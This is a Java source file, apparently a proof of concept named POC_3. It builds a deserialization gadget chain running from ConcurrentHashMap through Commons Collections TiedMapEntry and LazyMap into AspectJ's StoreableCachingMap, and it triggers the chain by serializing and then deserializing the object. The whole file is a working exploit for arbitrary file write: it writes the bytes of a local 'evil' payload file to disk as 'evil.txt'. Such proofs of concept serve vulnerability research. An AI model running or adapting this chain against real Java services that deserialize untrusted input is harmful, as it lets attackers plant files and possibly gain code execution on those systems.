package com.example.AspectJWeaver;

import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;

public class POC_3 {

    /***
     * <java.util.concurrent.ConcurrentHashMap: void readObject(java.io.ObjectInputStream)>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: int hashCode()>
     * <org.apache.commons.collections.keyvalue.TiedMapEntry: java.lang.Object getValue()>
     * <org.apache.commons.collections.map.LazyMap: java.lang.Object get(java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.Object put(java.lang.Object,java.lang.Object)>
     * <org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap: java.lang.String writeToPath(java.lang.String,byte[])>
     * <java.io.FileOutputStream: void write(byte[])>
     */

    public static void main(String[] args) throws Exception {
        Map scm = (Map) ReflectionUtil.createObject("org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap",
                new Class[]{String.class, int.class},
                new Object[]{"D:/temp", 12});

        byte[] content = Files.readAllBytes(Paths.get("./src/main/java/com/example/Evil/evil"));
        Transformer ct = new ConstantTransformer(content);
        Map lazyMap = LazyMap.decorate(scm, ct);

        TiedMapEntry t = new TiedMapEntry(new HashMap<>(), "evil.txt");
        ConcurrentHashMap map = new ConcurrentHashMap<>();
        map.put(t, "value");

        ReflectionUtil.setField(t, "map", lazyMap);
        SerializeUtil.deserialize(SerializeUtil.serialize(map));
    }

}